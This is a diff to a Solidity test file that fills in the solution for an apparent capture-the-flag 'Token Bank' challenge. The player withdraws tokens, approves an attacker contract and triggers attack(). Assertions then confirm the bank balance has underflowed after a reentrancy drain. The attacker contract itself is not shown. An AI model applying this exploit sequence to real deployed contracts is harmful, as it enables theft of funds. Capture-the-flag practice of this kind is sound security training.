@@ -17,14 +17,34 @@ contract TankBankTest is Test {
 
         // Put your solution here
 
-        assertEq(tokenBankChallenge.balanceOf(player), 500000e18);
-        assertEq(tokenBankChallenge.balanceOf(player), tokenBankChallenge.balanceOf(address(this)));
+        SimpleERC223Token ERC223Token = tokenBankChallenge.token();
+
+        assertEq(tokenBankChallenge.balanceOf(player), 500_000e18);
+        assertEq(tokenBankChallenge.balanceOf(address(this)), 500_000e18);
+        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), 0);
+        assertEq(ERC223Token.balanceOf(address(tokenBankChallenge)), 1_000_000e18);
+        assertEq(ERC223Token.balanceOf(player), 0);
+
+        vm.startPrank(player);
+
+        tokenBankChallenge.withdraw(500_000e18);
+        assertEq(tokenBankChallenge.balanceOf(player), 0);
+        assertEq(ERC223Token.balanceOf(player), 500_000e18);
+
+        ERC223Token.approve(address(tokenBankAttacker), ERC223Token.balanceOf(player));
+        assertEq(ERC223Token.allowance(player, address(tokenBankAttacker)), 500_000e18);
+
+        vm.stopPrank();
 
         tokenBankAttacker.attack();
 
-        assertEq(tokenBankChallenge.balanceOf(player), 500000e18);
-        assertEq(tokenBankChallenge.balanceOf(address(this)), 500000e18);
-        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), 0);
+        assertEq(tokenBankChallenge.balanceOf(player), 0);
+        assertEq(tokenBankChallenge.balanceOf(address(this)), 500_000e18);
+        uint256 amount;
+        unchecked {
+            amount -= 500_000e18;
+        }
+        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), amount);
 
         _checkSolved();
     }
